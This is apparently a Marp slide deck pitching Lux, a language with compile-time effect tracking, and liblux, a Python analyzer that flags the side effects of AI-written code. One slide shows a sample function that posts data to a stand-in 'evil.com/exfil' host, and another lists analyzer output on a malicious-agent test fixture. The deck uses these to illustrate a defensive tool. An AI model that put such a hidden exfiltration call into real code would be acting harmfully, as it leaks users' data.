---
marp: true
paginate: true
html: true
style: |
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
  :root {
    --bg: #0b0f15;
    --fg: #e8ecf1;
    --muted: #677285;
    --dim: #3d4a5c;
    --accent: #6c9fff;
    --surface: #141c24;
    --border: rgba(255,255,255,0.08);
    --green: #4ade80;
    --red: #f87171;
    --amber: #fbbf24;
  }
  section {
    background: var(--bg);
    color: var(--fg);
    font-family: 'Inter', system-ui, sans-serif;
    font-size: 28px;
    font-weight: 400;
    letter-spacing: -0.01em;
    padding: 60px 80px;
    line-height: 1.5;
  }
  h1 { font-size: 56px; font-weight: 400; letter-spacing: -0.03em; line-height: 1.15; color: #fff; margin-bottom: 24px; }
  h2 { font-size: 40px; font-weight: 400; letter-spacing: -0.02em; line-height: 1.2; color: #fff; margin-bottom: 20px; }
  h3 { font-size: 24px; font-weight: 500; letter-spacing: -0.01em; color: var(--muted); margin-bottom: 16px; }
  p, li { color: rgba(255,255,255,0.55); font-size: 24px; }
  strong { color: #fff; font-weight: 500; }
  em { color: var(--accent); font-style: italic; }
  code { background: var(--surface); color: var(--fg); padding: 2px 8px; border-radius: 4px; font-size: 0.85em; }
  pre { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 24px; font-size: 20px; line-height: 1.6; }
  pre code { background: none; padding: 0; color: var(--fg); }
  pre code .hljs-keyword, pre code .token.keyword { color: #c4a7ff !important; }
  pre code .hljs-string, pre code .token.string { color: #7dd3a8 !important; }
  pre code .hljs-function, pre code .token.function { color: #7cc4ff !important; }
  pre code .hljs-comment, pre code .token.comment { color: #4d5a6e !important; }
  pre code .hljs-built_in, pre code .token.builtin { color: #f0b67f !important; }
  pre code .hljs-number, pre code .token.number { color: #f0b67f !important; }
  pre code .hljs-title, pre code .token.class-name { color: #7cc4ff !important; }
  pre code .hljs-params { color: var(--fg) !important; }
  pre code .hljs-attr, pre code .token.attr-name { color: #c4a7ff !important; }
  mark { background: rgba(108,159,255,0.15); color: #fff; padding: 2px 6px; border-radius: 3px; }
  table { width: 100%; border-collapse: collapse; font-size: 22px; background: transparent !important; }
  th { text-align: left; color: var(--muted) !important; font-weight: 500; font-size: 14px; text-transform: uppercase; letter-spacing: 0.06em; padding: 12px 16px; border-bottom: 1px solid rgba(255,255,255,0.08); background: transparent !important; }
  td { padding: 14px 16px; border-bottom: 1px solid rgba(255,255,255,0.04); color: rgba(255,255,255,0.55) !important; background: transparent !important; }
  td strong { color: #fff !important; }
  tr { background: transparent !important; }
  tr:nth-child(even) { background: rgba(255,255,255,0.02) !important; }
  section.lead { display: flex; flex-direction: column; justify-content: center; }
  section.lead h1 { font-size: 64px; }
  section.centered { display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
  section.centered h2 { max-width: 800px; }
  section.centered p { max-width: 640px; }
  section.accent { background: var(--accent); }
  section.accent h1, section.accent h2, section.accent p { color: var(--bg); }
  section.accent strong { color: var(--bg); }
  section.metric { display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
  section.metric h2 { font-size: 72px; font-weight: 300; letter-spacing: -0.04em; color: #fff; }
  section.metric p { font-size: 24px; color: var(--muted); }
  footer { color: var(--dim); font-size: 14px; }
---

<!-- _class: lead -->
<!-- _paginate: false -->

# Lux

A language that shows its work.

<!--
Lux is a programming language where every function declares what it does to the world. The compiler enforces it. Designed for a world where AI agents write most of the code.
-->

---

<!-- _class: centered -->

## AI agents write plausible code<br>at superhuman speed.

Most of it is correct. The problem is when it isn't.

<!--
Devin has merged 1,500+ PRs at Gumroad. Nubank migrated 6M+ lines with AI agents. Factory's Droids run multi-day autonomous work. The code looks right. It usually is right. But when it's wrong, nobody catches it until production.
-->

---

## The invisible problem

```python
def transform_data(records):
    """Pure data transformation. Or is it?"""
    cleaned = [normalize(r) for r in records]
    requests.post("https://evil.com/exfil", json=cleaned)  # oops
    return cleaned
```

Nothing in the signature reveals the HTTP call.
No type checker catches it. No linter flags it.
It passes code review because it *looks* pure.

<!--
This is the fundamental problem. In every mainstream language, a function can secretly touch the network, write to disk, or access a database, and nothing in the signature reveals it. The function signature lies by omission.
-->

---

<!-- _class: centered -->

## What if the signature<br>couldn't lie?

---

## Lux: effects in the type system

```
fn transform(records: List<Record>) -> List<Record> {
    records |> map(normalize)
}

fn fetch_and_save(url: String) can Net, Fs, Fail {
    let data = net.get(url)?
    let result = transform(data)
    fs.write("output.json", json.encode(result))?
}
```

`transform` has no `can` clause. It's **pure**. The compiler guarantees it.
`fetch_and_save` declares `can Net, Fs, Fail`. That's everything it can do.

<!--
The keyword "can" reads as English. "This function can touch the network, can access the filesystem, and can fail." Silence means purity. A function with no can clause takes values, returns values, touches nothing. The compiler enforces this. An AI agent cannot introduce hidden side effects because the type system won't allow it.
-->

---

## Ten effects. Fixed. Not extensible.

| Effect | Meaning |
|--------|---------|
| **Net** | Touches the network |
| **Fs** | Reads or writes files |
| **Db** | Queries a database |
| **Console** | Terminal I/O |
| **Env** | Environment variables |
| **Time** | Clock reads, sleep |
| **Rand** | Random numbers |
| **Async** | Concurrent tasks |
| **Unsafe** | FFI, raw pointers |
| **Fail** | Can fail |

<!--
The vocabulary is deliberately fixed. Not extensible by user code. This is the key design decision. A fixed set means every Lux program's effects are comparable, auditable, and enforceable by CI policy. An AI agent can be told "generate code with no Net or Unsafe effects" and the compiler enforces it. Deno proved this model works with ~7 runtime permission categories. Lux moves it to compile time.
-->

---

<!-- _class: metric -->

## `lux audit`

The killer feature.

<!--
lux audit prints a complete manifest of what every function in your program does to the world. Machine-readable. Diffable. Enforceable as a CI gate. A security team can set policy: "this service may not use Unsafe." A CI pipeline can reject PRs that introduce unexpected effects. An AI agent's output can be audited before execution.
-->

---

## The audit manifest

```
$ lux audit src/main.lux

main                  can Net, Fs, Console, Fail
  load_config         can Fs, Fail
  fetch_users         can Net, Fail
    net.get           can Net, Fail
    parse_users       (pure)
  format_report       (pure)
  print               can Console
  write_report        can Fs, Fail
```

Every function. Every effect. Every call. One command.

<!--
This is what a security engineer wants. This is what a CI pipeline enforces. This is what an AI agent orchestrator checks before executing generated code. The manifest is the trust protocol.
-->

---

<!-- _class: lead -->

# Two products,<br>not one.

<!--
This is the Ghostty/libghostty insight. Mitchell Hashimoto built Ghostty as a terminal emulator. Then revealed it was a demo for libghostty, the terminal library underneath. The visible product attracted users. The library attracted builders. The lasting contribution was the library.
-->

---

<!-- _class: lead -->

# Lux is the language.<br>liblux is the library.

The effect checker, extracted as a standalone tool.
Works on **existing Python code**. No new language needed.

<!--
liblux exists today. It's a Python package that scans your code and reports which of the 10 effects each function performs. It walks the AST, resolves imports, and maps 80+ Python modules to effects. 22 tests passing. The language is the long game. The library ships now.
-->

---

## liblux in action

```
$ liblux check agent.py

agent.py  can Db, Env, Fs, Unsafe

  run_command:8       can Unsafe
  read_secrets:14     can Env, Fs
  exfiltrate:26       can Unsafe
  backdoor_db:31      can Db, Unsafe

0/4 functions are pure.
```

Four functions. Four effect signatures. Zero are pure.
The manifest tells you everything before you run a line.

<!--
This is real output from liblux running against a test fixture that simulates malicious agent code. subprocess calls are Unsafe. os.environ access is Env. open() is Fs. sqlite3 is Db. eval() is Unsafe. The tool catches all of it through static AST analysis.
-->

---

## The trust protocol

<style scoped>
.flow { display: flex; align-items: center; justify-content: center; gap: 20px; margin-top: 32px; }
.step { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 20px 24px; text-align: center; min-width: 160px; }
.step-num { font-size: 14px; color: var(--accent); font-weight: 500; text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 8px; }
.step-text { font-size: 20px; color: #fff; font-weight: 400; }
.arrow { color: var(--dim); font-size: 28px; }
.step-accent { border-color: var(--accent); background: rgba(108,159,255,0.08); }
</style>

<div class="flow">
  <div class="step">
    <div class="step-num">1</div>
    <div class="step-text">Agent generates code</div>
  </div>
  <div class="arrow">→</div>
  <div class="step step-accent">
    <div class="step-num">2</div>
    <div class="step-text">liblux produces manifest</div>
  </div>
  <div class="arrow">→</div>
  <div class="step">
    <div class="step-num">3</div>
    <div class="step-text">Orchestrator checks policy</div>
  </div>
  <div class="arrow">→</div>
  <div class="step">
    <div class="step-num">4</div>
    <div class="step-text">Execute or reject</div>
  </div>
</div>

<br>

The manifest is a **commitment device**.
The agent can't secretly access the network.
The type system prevents it. Not a sandbox. A proof.

<!--
In game theory, a commitment device makes defection impossible or detectable. Docker containers are runtime sandboxes: they detect violations after they happen. Lux's effect system is a compile-time commitment device: it prevents violations before they happen. The code that would violate the policy doesn't compile. This is strictly stronger than runtime sandboxing, and cheaper to enforce.
-->

---

## Nobody is doing this.

| Approach | Static? | Fixed vocabulary? | AI-focused? |
|---|---|---|---|
| **Lux / liblux** | **Yes** | **Yes (10 effects)** | **Yes** |
| Koka | Yes | No (open) | No |
| Deno permissions | No (runtime) | Yes (~7) | No |
| Rust effects RFC | Planned | No (async/const/try) | No |
| Agent frameworks | No (sandbox) | No | Yes |

<br>

The PL world has static + open.
The AI world has runtime + ad-hoc.
**Lux connects them.**

<!--
We researched every language with an effect system, every AI agent framework's safety model, every relevant RFC. The combination of static checking, fixed vocabulary, and AI focus is genuinely unoccupied. Deno validates the fixed-vocabulary model at runtime. Koka validates effect systems in types. Nobody has combined them for AI code safety.
-->

---

<!-- _class: centered -->

## OWASP already named the problems.

**LLM07:** Insecure Plugin Design
**LLM08:** Excessive Agency

Lux is the answer.

<!--
OWASP's Top 10 for LLM Applications identifies exactly the problems Lux solves. LLM07: "LLM plugins processing untrusted inputs and having insufficient access control risk severe exploits." LLM08: "Granting LLMs unchecked autonomy to take action can lead to unintended consequences." The market demand exists. The solution doesn't. Yet.
-->

---

<!-- _class: lead -->
<!-- _paginate: false -->

# The vocabulary is the platform.
# The language is one client.

<!--
HCL wasn't a product. It was infrastructure that Terraform, Vault, Consul, Nomad, and Packer all built on. The vocabulary was the platform. Lux's ten effects are our HCL. If this vocabulary becomes the standard way to describe what code does to the world, Lux wins regardless of how many people write Lux code. The vocabulary is the platform. The language is one implementation. liblux is the distribution mechanism.
-->
